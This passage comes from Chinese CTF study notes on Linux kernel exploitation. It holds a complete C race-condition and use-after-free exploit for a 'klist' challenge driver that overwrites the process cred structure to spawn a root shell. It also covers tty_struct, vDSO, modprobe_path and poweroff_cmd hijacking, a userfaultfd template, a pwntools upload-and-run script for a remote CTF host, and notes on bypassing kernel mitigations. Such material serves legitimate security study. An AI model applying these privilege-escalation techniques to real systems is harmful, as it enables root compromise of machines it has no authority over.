htonl(INADDR_LOOPBACK);addr.sin_family = AF_INET;addr.sin_port = htons(6666);msg.msg_control = buff;msg.msg_controllen = BUFF_SIZE; msg.msg_name = (caddr_t)&amp;addr;msg.msg_namelen = sizeof(addr);for(int i = 0; i &lt; 100000; i++) &#123; sendmsg(sockfd, &amp;msg, 0);&#125; 调用链： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657static int ___sys_sendmsg(struct socket *sock, struct user_msghdr __user *msg, struct msghdr *msg_sys, unsigned int flags, struct used_address *used_address, unsigned int allowed_msghdr_flags)&#123; struct compat_msghdr __user *msg_compat = (struct compat_msghdr __user *)msg; struct sockaddr_storage address; struct iovec iovstack[UIO_FASTIOV], *iov = iovstack; unsigned char ctl[sizeof(struct cmsghdr) + 20] __aligned(sizeof(__kernel_size_t)); // 创建44字节的栈缓冲区ctl，20是ipv6_pktinfo结构的大小 unsigned char *ctl_buf = ctl; // ctl_buf指向栈缓冲区ctl int ctl_len; ssize_t err; msg_sys-&gt;msg_name = &amp;address; if (MSG_CMSG_COMPAT &amp; flags) err = get_compat_msghdr(msg_sys, msg_compat, NULL, &amp;iov); else err = copy_msghdr_from_user(msg_sys, msg, NULL, &amp;iov); // 用户数据拷贝到msg_sys，只拷贝msghdr消息头部 if (err &lt; 0) return err; err = -ENOBUFS; if (msg_sys-&gt;msg_controllen &gt; INT_MAX) //如果msg_sys小于INT_MAX，就把ctl_len赋值为用户提供的msg_controllen goto out_freeiov; flags |= (msg_sys-&gt;msg_flags &amp; allowed_msghdr_flags); ctl_len = msg_sys-&gt;msg_controllen; if ((MSG_CMSG_COMPAT &amp; flags) &amp;&amp; ctl_len) &#123; err = cmsghdr_from_user_compat_to_kern(msg_sys, sock-&gt;sk, ctl, sizeof(ctl)); if (err) goto out_freeiov; ctl_buf = msg_sys-&gt;msg_control; ctl_len = msg_sys-&gt;msg_controllen; &#125; else if (ctl_len) &#123; BUILD_BUG_ON(sizeof(struct cmsghdr) != CMSG_ALIGN(sizeof(struct cmsghdr))); if (ctl_len &gt; sizeof(ctl)) &#123; //注意用户数据的size必须大于44字节 ctl_buf = sock_kmalloc(sock-&gt;sk, ctl_len, GFP_KERNEL);//sock_kmalloc最后会调用kmalloc 分配 ctl_len 大小的堆块 if (ctl_buf == NULL) goto out_freeiov; &#125; err = -EFAULT; /* 注意，msg_sys-&gt;msg_control是用户可控的用户缓冲区；ctl_len是用户可控的长度。 用户数据拷贝到ctl_buf内核空间。 */ if (copy_from_user(ctl_buf, (void __user __force *)msg_sys-&gt;msg_control, ctl_len)) goto out_freectl; msg_sys-&gt;msg_control = ctl_buf; &#125; msg_sys-&gt;msg_flags = flags;... 1cat /proc/kallsyms | grep sock_kmalloc exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310// gcc -static -pthread xx.c -g -o xx#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;string.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/mman.h&gt;#include &lt;poll.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;signal.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/types.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;poll.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt;#define ADD 0x1337#define SELECT 0x1338#define REMOVE 0x1339#define GET_HEAD 0x133Aint fd;int key;struct mystruct&#123; size_t size; char* myptr;&#125;;struct mystruct* global_ptr;char* ptr;void check_root()&#123; while(1)&#123; sleep(1); if(getuid() == 0)&#123; puts("[:)]Root now!!!"); system("/bin/sh"); //char* args[2] = &#123;"/bin/sh", NULL&#125;; //execv("/bin/sh", args); exit(0); &#125; &#125;&#125;int main()&#123; int choice = 3; setvbuf(stdout,0LL,2,0LL); fd = open("/dev/klist",2); if(fd &lt; 0)&#123; puts("[:(]open error..."); exit(0); &#125; global_ptr = malloc(0x10); char* buf = malloc(0x1000); char* buf1 = malloc(0x1000); char* buf2 = malloc(0x1000); char* buf7 = malloc(0x1000); memset(buf,'\x11',0x1000); memset(buf1,'\x11',0x1000); memset(buf2,'\x22',0x1000); memset(buf7,'\x77',0x1000); global_ptr-&gt;size = 0x280-0x18; global_ptr-&gt;myptr = buf1; for(int i = 0;i &lt; 200;i++)&#123; if(fork() == 0)&#123; check_root(); &#125; &#125; ioctl(fd,ADD,global_ptr); ioctl(fd,SELECT,0); if(fork() == 0)&#123; while(1)&#123; global_ptr-&gt;myptr = buf1; ioctl(fd,ADD,global_ptr); //success -&gt; flag = 0 &amp; first free ioctl(fd,SELECT,0); //success -&gt; flag = 1 ioctl(fd,REMOVE,0); //success -&gt; flag = 0 &amp; double free global_ptr-&gt;myptr = buf2; ioctl(fd,ADD,global_ptr); //test UAF set flag = 1 read(fd,buf,0x8); if(buf[0] != '\x11')&#123; puts("[:)]Race success 1"); break; &#125; ioctl(fd,REMOVE,0); &#125; sleep(0.5); ioctl(fd,REMOVE,0); //success -&gt; free into anthor slab ? if(choice == 1)&#123; int fds[2]; pipe(&amp;fds[0]); //get UAF chunk write(fds[1],buf7,0x280); &#125; else if(choice == 2)&#123; struct&#123; long mtype; char mtext[0x280-0x30]; &#125;msg; memset(msg.mtext,0x42,0x280-0x30-1); msg.mtext[0x280-0x30] = 0; msg.mtype = 1; int msqid = msgget(IPC_PRIVATE,0644|IPC_CREAT); msgsnd(msqid,&amp;msg,sizeof(msg.mtext),0); //get UAF chunk &#125; else if(choice == 3)&#123; char buff[0x280]; struct msghdr msg = &#123;0&#125;; struct sockaddr_in addr = &#123;0&#125;; int sockfd = socket(AF_INET,SOCK_DGRAM,0); addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK); addr.sin_family = AF_INET; addr.sin_port = htons(6666); msg.msg_control = buff; msg.msg_controllen = 0x280; msg.msg_name = (caddr_t)&amp;addr; msg.msg_namelen = sizeof(addr); sendmsg(sockfd,&amp;msg,0); //get UAF chunk &#125; uint32_t* user_buf = calloc(1,0x1000000); read(fd,user_buf,0x1000000); for(int i = 0;i &lt; 0x1000000/4;i++)&#123; if(user_buf[i+0] == 0x3e8 &amp;&amp; user_buf[i+1] == 0x3e8 &amp;&amp; user_buf[i+2] == 0x3e8 &amp;&amp; user_buf[i+3] == 0x3e8 &amp;&amp; user_buf[i+4] == 0x3e8 &amp;&amp; user_buf[i+5] == 0x3e8 &amp;&amp; user_buf[i+6] == 0x3e8 &amp;&amp; user_buf[i+7] == 0x3e8) &#123; puts("[:)]find cred!!!"); user_buf[i-1] = 0; user_buf[i] = 0; user_buf[i+1] = 0; user_buf[i+2] = 0; user_buf[i+3] = 0; user_buf[i+4] = 0; user_buf[i+5] = 0; user_buf[i+6] = 0; user_buf[i+7] = 0; write(fd,user_buf,4*(i+8)); break; &#125; &#125; check_root(); &#125; else&#123; while(1)&#123; ioctl(fd,GET_HEAD,buf); read(fd,buf,0x8); if(buf[0] != '\x11')&#123; puts("[:)]Race success 2"); break; &#125; &#125; check_root(); &#125; return 0;&#125;/*RAX: 0xffff88007a056e40 --&gt; 0x3e800000002 RBX: 0xffff88007b9f4ff8 --&gt; 0x0 RCX: 0x1 RDX: 0x88 RSI: 0x15080c0 RDI: 0xffff88007cc01800 --&gt; 0x23b20 RBP: 0xffffc90000b8fed8 --&gt; 0x0 RSP: 0xffffc90000b8fe70 --&gt; 0xffff88007b9f4ff8 --&gt; 0x0 RIP: 0xffffffff811a37da --&gt; 0xc08548fffe5091e8 R8 : 0xffff88007f624ae0 --&gt; 0xffff88007b354618 --&gt; 0xffff88007b354640 --&gt; 0xffff88007b354668 --&gt; 0xffff88007b354690 --&gt; 0xffff88007b3546b8 (--&gt; ...)R9 : 0x0 R10: 0xffff88007b3545f0 --&gt; 0xffff88007b9f4ff8 --&gt; 0x0 R11: 0x0 R12: 0xffff88007c598c00 --&gt; 0xcb000000ce R13: 0x100000 R14: 0x0 R15: 0x0EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0xffffffff811a37c9: mov edx,0x88 0xffffffff811a37ce: mov esi,0x15080c0 0xffffffff811a37d3: mov r13d,DWORD PTR [rip+0x10bf026] # 0xffffffff82262800=&gt; 0xffffffff811a37da: call 0xffffffff81188870 0xffffffff811a37df: test rax,rax 0xffffffff811a37e2: je 0xffffffff811a3910 0xffffffff811a37e8: cmp r13d,0xffff 0xffffffff811a37ef: mov rbx,raxGuessed arguments:arg[0]: 0xffff88007cc01800 --&gt; 0x23b20 arg[1]: 0x15080c0 arg[2]: 0x88 RAX: 0x0 RBX: 0xffff88007b3c8780 --&gt; 0x0 RCX: 0x0 RDX: 0x0 RSI: 0x15080c0 RDI: 0x280 RBP: 0x10 RSP: 0xffffc90000b8fe70 --&gt; 0xffff88007b9f4ff8 --&gt; 0x0 RIP: 0xffffffff811a3851 --&gt; 0xc08548fffe54aae8 R8 : 0xffff88007f623b20 --&gt; 0xffff88007b3c8840 --&gt; 0xffff88007b3c8900 --&gt; 0xffff88007b3c89c0 --&gt; 0xffff88007b3c8a80 --&gt; 0xffff88007b3c8b40 (--&gt; ...)R9 : 0x0 R10: 0xffff88007b3c8780 --&gt; 0x0 R11: 0x0 R12: 0xffff88007c598c00 --&gt; 0xcb000000ce R13: 0x10 R14: 0x0 R15: 0x0EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0xffffffff811a3843: lea rdi,[r13+r13*4+0x0] 0xffffffff811a3848: mov esi,0x15080c0 0xffffffff811a384d: shl rdi,0x3=&gt; 0xffffffff811a3851: call 0xffffffff81188d00 0xffffffff811a3856: test rax,rax 0xffffffff811a3859: mov QWORD PTR [rbx+0x78],rax 0xffffffff811a385d: je 0xffffffff811a38fe 0xffffffff811a3863: lea rdi,[rbx+0x20]Guessed arguments:arg[0]: 0x280 arg[1]: 0x15080c0 RAX: 0xffff88007ace8c00 --&gt; 0x0 RBX: 0xffff88007b3c8780 --&gt; 0x0 RCX: 0x0 RDX: 0xffffffff828e9558 --&gt; 0x0 RSI: 0xffffffff81ff2684 ("&amp;pipe-&gt;wait")RDI: 0xffff88007b3c87a0 --&gt; 0x0 RBP: 0x10 RSP: 0xffffc90000b8fe70 --&gt; 0xffff88007b9f4ff8 --&gt; 0x0 RIP: 0xffffffff811a3875 --&gt; 0x1b848ffeeb5e6e8 R8 : 0xffff88007f623b80 --&gt; 0xffff88007ace9400 --&gt; 0xffff88007ace9800 --&gt; 0xffff88007ace9c00 --&gt; 0xffff88007acea000 --&gt; 0xffff88007acea400 (--&gt; ...)R9 : 0x0 R10: 0xffff88007ace8c00 --&gt; 0x0 R11: 0x0 R12: 0xffff88007c598c00 --&gt; 0xcb000000ce R13: 0x10 R14: 0x0 R15: 0x0EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0xffffffff811a3863: lea rdi,[rbx+0x20] 0xffffffff811a3867: mov rdx,0xffffffff828e9558 0xffffffff811a386e: mov rsi,0xffffffff81ff2684=&gt; 0xffffffff811a3875: call 0xffffffff8108ee60 0xffffffff811a387a: movabs rax,0x100000001 0xffffffff811a3884: mov DWORD PTR [rbx+0x40],r13d 0xffffffff811a3888: mov QWORD PTR [rbx+0x80],r12 0xffffffff811a388f: mov QWORD PTR [rbx+0x54],raxGuessed arguments:arg[0]: 0xffff88007b3c87a0 --&gt; 0x0 arg[1]: 0xffffffff81ff2684 ("&amp;pipe-&gt;wait")arg[2]: 0xffffffff828e9558 --&gt; 0x0 RAX: 0x100000001 RBX: 0xffff88007b3c8780 --&gt; 0x0 RCX: 0x0 RDX: 0xffffffff828e9558 --&gt; 0x0 RSI: 0xffffffff81ff2690 ("&amp;pipe-&gt;mutex")RDI: 0xffff88007b3c8780 --&gt; 0x0 RBP: 0x10 RSP: 0xffffc90000b8fe70 --&gt; 0xffff88007b9f4ff8 --&gt; 0x0 RIP: 0xffffffff811a38a4 --&gt; 0xd88948ffeef9b7e8 R8 : 0xffff88007f623b80 --&gt; 0xffff88007ace9400 --&gt; 0xffff88007ace9800 --&gt; 0xffff88007ace9c00 --&gt; 0xffff88007acea000 --&gt; 0xffff88007acea400 (--&gt; ...)R9 : 0x0 R10: 0xffff88007ace8c00 --&gt; 0x0 R11: 0x0 R12: 0xffff88007c598c00 --&gt; 0xcb000000ce R13: 0x10 R14: 0x0 R15: 0x0EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0xffffffff811a3893: mov rdi,rbx 0xffffffff811a3896: mov rdx,0xffffffff828e9558 0xffffffff811a389d: mov rsi,0xffffffff81ff2690=&gt; 0xffffffff811a38a4: call 0xffffffff81093260 0xffffffff811a38a9: mov rax,rbx 0xffffffff811a38ac: pop rbx 0xffffffff811a38ad: pop rbp 0xffffffff811a38ae: pop r12Guessed arguments:arg[0]: 0xffff88007b3c8780 --&gt; 0x0 arg[1]: 0xffffffff81ff2690 ("&amp;pipe-&gt;mutex")arg[2]: 0xffffffff828e9558 --&gt; 0x0 */ 2019D^3CTF_Knote_V2https://github.com/BrieflyX/ctf-pwns/tree/master/kernel/knoteV2 2019TWCTF_Gnotehttps://github.com/BrieflyX/ctf-pwns/tree/master/kernel/gnote # 待续。。。其他tyy_struct &amp;&amp; tty_operations：若是可以伪造/控制/修改一个ptmx设备文件的tty_struct结构体则可以通过对此设备文件进行操作以控制执行流。目前只见过UAF和堆溢出中的应用。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152struct tty_struct &#123; int magic; //4 struct kref kref; //4 struct device *dev; //8 struct tty_driver *driver; //8 const struct tty_operations *ops; //tty_operations结构体 offser=24 int index; /* Protects ldisc changes: Lock tty not pty */ struct ld_semaphore ldisc_sem; struct tty_ldisc *ldisc; struct mutex atomic_write_lock; struct mutex legacy_mutex; struct mutex throttle_mutex; struct rw_semaphore termios_rwsem; struct mutex winsize_mutex; spinlock_t ctrl_lock; spinlock_t flow_lock; /* Termios values are protected by the termios rwsem */ struct ktermios termios, termios_locked; struct termiox *termiox; /* May be NULL for unsupported */ char name[64]; struct pid *pgrp; /* Protected by ctrl lock */ struct pid *session; unsigned long flags; int count; struct winsize winsize; /* winsize_mutex */ unsigned long stopped:1, /* flow_lock */ flow_stopped:1, unused:BITS_PER_LONG - 2; int hw_stopped; unsigned long ctrl_status:8, /* ctrl_lock */ packet:1, unused_ctrl:BITS_PER_LONG - 9; unsigned int receive_room; /* Bytes free for queue */ int flow_change; struct tty_struct *link; struct fasync_struct *fasync; wait_queue_head_t write_wait; wait_queue_head_t read_wait; struct work_struct hangup_work; void *disc_data; void *driver_data; spinlock_t files_lock; /* protects tty_files list */ struct list_head tty_files;#define N_TTY_BUF_SIZE 4096 int closing; unsigned char *write_buf; int write_cnt; /* If the tty has a pending do_SAK, queue it here - akpm */ struct work_struct SAK_work; struct tty_port *port;&#125; __randomize_layout; 123456789101112131415161718192021222324252627282930313233343536373839404142434445struct tty_operations &#123; struct tty_struct * (*lookup)(struct tty_driver *driver, struct file *filp, int idx); int (*install)(struct tty_driver *driver, struct tty_struct *tty); void (*remove)(struct tty_driver *driver, struct tty_struct *tty); int (*open)(struct tty_struct * tty, struct file * filp); void (*close)(struct tty_struct * tty, struct file * filp); void (*shutdown)(struct tty_struct *tty); void (*cleanup)(struct tty_struct *tty); int (*write)(struct tty_struct * tty, //7 const unsigned char *buf, int count); int (*put_char)(struct tty_struct *tty, unsigned char ch); void (*flush_chars)(struct tty_struct *tty); int (*write_room)(struct tty_struct *tty); int (*chars_in_buffer)(struct tty_struct *tty); int (*ioctl)(struct tty_struct *tty, //12 unsigned int cmd, unsigned long arg); long (*compat_ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg); void (*set_termios)(struct tty_struct *tty, struct ktermios * old); void (*throttle)(struct tty_struct * tty); void (*unthrottle)(struct tty_struct * tty); void (*stop)(struct tty_struct *tty); void (*start)(struct tty_struct *tty); void (*hangup)(struct tty_struct *tty); int (*break_ctl)(struct tty_struct *tty, int state); void (*flush_buffer)(struct tty_struct *tty); void (*set_ldisc)(struct tty_struct *tty); void (*wait_until_sent)(struct tty_struct *tty, int timeout); void (*send_xchar)(struct tty_struct *tty, char ch); int (*tiocmget)(struct tty_struct *tty); int (*tiocmset)(struct tty_struct *tty, unsigned int set, unsigned int clear); int (*resize)(struct tty_struct *tty, struct winsize *ws); int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew); int (*get_icount)(struct tty_struct *tty, struct serial_icounter_struct *icount); void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);#ifdef CONFIG_CONSOLE_POLL int (*poll_init)(struct tty_driver *driver, int line, char *options); int (*poll_get_char)(struct tty_driver *driver, int line); void (*poll_put_char)(struct tty_driver *driver, int line, char ch);#endif int (*proc_show)(struct seq_file *, void *);&#125; __randomize_layout; //256bytes 32个函数指针 open:3 write:7 close:4 ioctl:12 tty_struct[0] = 0x100005401，tty_struct[3] = 内核基址，tty_struct[7] = 内核堆地址 tty_operation一般劫持write函数较为简便，此时rax正好指向tty_operation的基地址。 cred &amp;&amp; task_struct &amp;&amp; thread_info &amp;&amp; 内核stack：每个进程有一个task_struct，这个结构体中记录了进程的信息，被称为进程描述符。 123cred --&gt; cred结构体位置real_cred --&gt; cred结构体位置comm[] --&gt; 进程的名字 可以用prctl(PR_SET_NAME,name)定制comm[]，需要strlen(name)&lt;=15，然后通过内存匹配搜寻内核中comm[]位置，用if(cred == real_cred)来过滤，找到cred地址后，改前28个字节全为0即可提权。 123456789101112131415161718192021222324252627282930313233343536373839struct cred &#123; atomic_t usage;#ifdef CONFIG_DEBUG_CREDENTIALS atomic_t subscribers; /* number of processes subscribed */ void *put_addr; unsigned magic;#define CRED_MAGIC 0x43736564#define CRED_MAGIC_DEAD 0x44656144#endif kuid_t uid; /* real UID of the task */ //8个1000可作为过滤器 kgid_t gid; /* real GID of the task */ kuid_t suid; /* saved UID of the task */ kgid_t sgid; /* saved GID of the task */ kuid_t euid; /* effective UID of the task */ kgid_t egid; /* effective GID of the task */ kuid_t fsuid; /* UID for VFS ops */ kgid_t fsgid; /* GID for VFS ops */ unsigned securebits; /* SUID-less security management */ kernel_cap_t cap_inheritable; /* caps our children can inherit */ kernel_cap_t cap_permitted; /* caps we're permitted */ kernel_cap_t cap_effective; /* caps we can actually use */ kernel_cap_t cap_bset; /* capability bounding set */ kernel_cap_t cap_ambient; /* Ambient capability set */#ifdef CONFIG_KEYS unsigned char jit_keyring; /* default keyring to attach requested * keys to */ struct key __rcu *session_keyring; /* keyring inherited over fork */ struct key *process_keyring; /* keyring private to this process */ struct key *thread_keyring; /* keyring private to this thread */ struct key *request_key_auth; /* assumed request_key authority */#endif#ifdef CONFIG_SECURITY void *security; /* subjective LSM security */#endif struct user_struct *user; /* real user ID subscription */ struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */ struct group_info *group_info; /* supplementary groups for euid/fsgid */ struct rcu_head rcu; /* RCU deletion hook */&#125;; vDSO：内核态与用户态共享数据段，内核态有rw权限（高版本无w权限），用户态有rx权限。 内核态写shellcode，用户态调用。 内核态调用set_memory_rw函数更改vDSO段权限，用户态写shellcode，用户态调用。 dump找偏移方法： 爆破地址方法： 通过ELF Sigrature。 通过gettimeofday字符串：先在用户态找到gettimeofday字符串相对于开头的偏移，再到内核态爆破。 具体参照2015csaw_stringipc解法二。 prctl：32位：先泄露kernel_base。 劫持task_prctl为ser_memmory_rw，调用prctl并且传入vDSO地址，之后使用和劫持vDSO同样的方法。 64位：因为有参数截断问题，security_task_prctl函数的第一个参数为int型，开启了smep&amp;smap攻击会失效。 先泄露kernel_base，目前见过的方法为通过内核栈上脏数据泄露和泄露vDSO。 prctl -&gt; security_task_prctl -&gt; task_prctl 通过动态调试找到task_prctl的偏移，劫持task_prctl为poweroff_work_func。 poweroff_work_func() -&gt; __orderly_poweroff -&gt; run_cmd() -&gt; call_usermodehelper() 通过动态调试找到poweroff_cmd字符串的偏移，将其改为我们想执行的命令。 限制：有的内核中没有security_task_prctl，有的内核不允许更改hook。 call_usermodehelper：不需要劫持函数虚表，不需要传参数那么麻烦，只需要修改变量即可提权。 后四种暂未知道如何触发： （1） modprobe_path 1234567891011// /kernel/kmod.cchar modprobe_path[KMOD_PATH_LEN] = "/sbin/modprobe";// /kernel/kmod.cstatic int call_modprobe(char *module_name, int wait) argv[0] = modprobe_path; info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL, NULL, free_modprobe_argv, NULL); return call_usermodehelper_exec(info, wait | UMH_KILLABLE);// /kernel/kmod.cint __request_module(bool wait, const char *fmt, ...) ret = call_modprobe(module_name, wait ? UMH_WAIT_PROC : UMH_WAIT_EXEC); __request_module - try to load a kernel module 触发：可通过执行错误格式的elf文件来触发执行modprobe_path指定的文件。 （2）poweroff_cmd 123456789// /kernel/reboot.cchar poweroff_cmd[POWEROFF_CMD_PATH_LEN] = "/sbin/poweroff";// /kernel/reboot.cstatic int run_cmd(const char *cmd) argv = argv_split(GFP_KERNEL, cmd, NULL); ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);// /kernel/reboot.cstatic int __orderly_poweroff(bool force) ret = run_cmd(poweroff_cmd); 触发：执行__orderly_poweroff()/poweroff_work_func即可。 （3）uevent_helper 1234567891011121314151617// /lib/kobject_uevent.c#ifdef CONFIG_UEVENT_HELPERchar uevent_helper[UEVENT_HELPER_PATH_LEN] = CONFIG_UEVENT_HELPER_PATH;// /lib/kobject_uevent.cstatic int init_uevent_argv(struct kobj_uevent_env *env, const char *subsystem)&#123; ...... env-&gt;argv[0] = uevent_helper; ...... &#125;// /lib/kobject_uevent.cint kobject_uevent_env(struct kobject *kobj, enum kobject_action action, char *envp_ext[])&#123;...... retval = init_uevent_argv(env, subsystem); info = call_usermodehelper_setup(env-&gt;argv[0], env-&gt;argv, env-&gt;envp, GFP_KERNEL, NULL, cleanup_uevent_env, env);......&#125; （4）ocfs2_hb_ctl_path 123456// /fs/ocfs2/stackglue.cstatic char ocfs2_hb_ctl_path[OCFS2_MAX_HB_CTL_PATH] = "/sbin/ocfs2_hb_ctl";// /fs/ocfs2/stackglue.cstatic void ocfs2_leave_group(const char *group) argv[0] = ocfs2_hb_ctl_path; ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC); （5）nfs_cache_getent_prog 123456789101112// /fs/nfs/cache_lib.cstatic char nfs_cache_getent_prog[NFS_CACHE_UPCALL_PATHLEN] = "/sbin/nfs_cache_getent";// /fs/nfs/cache_lib.cint nfs_cache_upcall(struct cache_detail *cd, char *entry_name) char *argv[] = &#123; nfs_cache_getent_prog, cd-&gt;name, entry_name, NULL &#125;; ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC); （6）cltrack_prog 123456// /fs/nfsd/nfs4recover.cstatic char cltrack_prog[PATH_MAX] = "/sbin/nfsdcltrack";// /fs/nfsd/nfs4recover.cstatic int nfsd4_umh_cltrack_upcall(char *cmd, char *arg, char *env0, char *env1) argv[0] = (char *)cltrack_prog; ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC); userfaultfd：我们的虚拟内存和物理内存(RAM)存在着映射关系，每当我们对虚拟地址的内存进行读写时，内核都会通过页表来查找对应的物理内存帧，若是没有对应的帧，就会触发缺页中断。 内核提供了用户自定义缺页中断处理方式的接口，也就是userfaultfd，我们有时候为了利用漏洞不得不造成缺页中断，我们就可以使用userfaultfd来触发中断后进入我们自定义的流程从而引发竞争，例如：在写的时候触发中断，然后我们先delete一下，再继续完成正常写的操作，等于有了UAF，常规用法如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748void handle(void* uffd)&#123; struct pollfd mypollfd; mypollfd.fd = (unsigned long)uffd; mypollfd.events = POLLIN; int re = poll(&amp;mypollfd,1,-1); if(re &lt;= 0)&#123; puts("[:(]Catch error..."); exit(0); &#125; puts("[:)]Struck the pagefault!!!"); sleep(1000);&#125;void register_uffd(uint64_t fault_page,uint64_t fault_page_size)&#123; struct uffdio_api myapi; struct uffdio_register myuffd; pthread_t pt; int uffd = syscall(__NR_userfaultfd,O_CLOEXEC|O_NONBLOCK); myapi.api = UFFD_API; myapi.features = 0; if(ioctl(uffd,UFFDIO_API,&amp;myapi) == -1)&#123; puts("[:(]Api error..."); exit(-1); &#125; myuffd.range.start = fault_page; myuffd.range.len = fault_page_size; myuffd.mode = UFFDIO_REGISTER_MODE_MISSING; if(ioctl(uffd,UFFDIO_REGISTER,&amp;myuffd) == -1)&#123; puts("[:(]Register error..."); exit(-1); &#125; int re = pthread_create(&amp;pt,NULL,handle,(void*)uffd); if(re != 0)&#123; puts("[:(]Create pthread error..."); exit(-1); &#125;&#125;char* mmap_addr = mmap(NULL,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);uint64_t fault_page = mmap_addr; //监视内存起始地址uint64_t fault_page_size = 0x1000; //监视内存长度register_uffd(fault_page,fault_page_size);//一旦被监视的内存区域触发缺页中断，poll会catch到信号，然后会进入之后的用户自定义流程，在这里是使此进程sleep(1000)，我们就可以在其他进程继续操作。当然这只是最简单的操作。 race：内核与用户态不同，我们可以随意控制exp这个进程，也就意味着我们可以产生无限多的子进程和线程，这也就导致了竞争问题，即double petch。当看到启动内核脚本开启了：core=2 thread=2等非1时就需要考虑到竞争的可能性。 这类题目难度较大，也较为灵活，需要对题目的细节有较深的理解，理清思路为关键。可用列表先理清楚思路。 thread1 thread2 。。。 。。。 。。。 。。。 。。。 。。。 内核利用的核心：如何获取一个具有root权限的进程开启的shell？ root权限的shell必然是root权限的进程调用产生的，所以就有了以下几个办法： 让当前进程的权限提升为root，也就是对exp这个进程提权，然后自己运行system(&quot;/bin/sh&quot;)。一般有改当前进程的cred结构体前28字节为全0，和commit_creds(prepare_kernel_cred(0))两种办法。 在当前低权限进程（也就是在exp中）监听一个端口，让某个具有root权限的进程反弹shell连接此端口，这样我们也会获得一个具有root权限的shell。 利用内核中已有的包装好的提权函数，想办法控制其参数并触发它，这里call_usermodehelper使用较多，也衍生出了poweroff_cmd，modprobe_path等变种方法。 内存映射：未开启kalsr的默认情况： 我们可以看到： 0x0000,0000,0000,0000 ~ 0x0000,7fff,ffff,f000为用户态空间。 0x0000,7fff,ffff,f000 ~ 0x0000,8000,0000,0000为保护空间。 0xffff,8000,0000,0000 ~ 0xffff,8800,0000,0000为无关性地址。 0xffff,8800,0000,0000 ~ 0xffff,c800,0000,0000为内核态的内存区，例如kmalloc，kzalloc之类申请的内存都在这一块区域。 0xffff,c900,0000,0000 ~ 0xffff,e900,0000,0000为内核态的vmalloc映射区。 0xffff,ffff,8000,0000 ~ 0xffff,ffff,a000,0000为内核态的内核主体映射区，也就是vmlinux加载的地址，内部含有代码与数据。 0xffff,ffff,a000,0000 ~ 0xffff,ffff,ff60,0000为内核态的内核模块映射区，也就是.ko文件加载的地址，内部含有代码与数据。 0xffff,ffff,ff60,0000 ~ 0xffff,ffff,ff60,1000为vsyscall地址，用户态可访问的且地址固定的一块区域。 但是我尝试了开启了kaslr之后其实这个地址分布只能作为参考，并不一定准确。 physmap = 0xffff,8800,0000,0000 slub/slab = 0xffff,8880,0000,0000 打远程的脚本：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#!/usr/bin/pythonfrom pwn import *HOST = "35.221.78.115"PORT = 10022USER = "pwn"PW = "pwn"def compile(): log.info("Compile") os.system("musl-gcc -w -s -static -o3 pwn2.c -o pwn")def exec_cmd(cmd): r.sendline(cmd) r.recvuntil("$ ")def upload(): p = log.progress("Upload") with open("pwn", "rb") as f: data = f.read() encoded = base64.b64encode(data) r.recvuntil("$ ") for i in range(0, len(encoded), 300): p.status("%d / %d" % (i, len(encoded))) exec_cmd("echo \"%s\" &gt;&gt; benc" % (encoded[i:i+300])) exec_cmd("cat benc | base64 -d &gt; bout") exec_cmd("chmod +x bout") p.success()def exploit(r): compile() upload() r.interactive() returnif __name__ == "__main__": if len(sys.argv) &gt; 1: session = ssh(USER, HOST, PORT, PW) r = session.run("/bin/sh") exploit(r) else: r = process("./startvm.sh") print util.proc.pidof(r) pause() exploit(r) 保护机制：smep/PNX &amp; smap：用户态代码禁止执行与用户态数据禁止访问。 如果可以ROP的话，首先是ropchain需要放在内核内存中，其次是需要mov cr4,0x6f0。 KASLR：四个随机化： 内核栈基，内核模块基，内核代码基，内核堆基。 KPTI：kernel为了缓解Meltdown漏洞的威胁，从4.15版本引入了KPTI(Kernel Page Table Isolation) (a.k.a KAISER) 技术，将内核页表与用户态页表完全隔离，（通过cr3寄存器控制开关，也许可以修改cr3绕过？等待大佬研究），iretq返回用户态函数地址时会产生SIGSEGV错误，解决方法也很简单，用get shell函数catch这个signal即可。 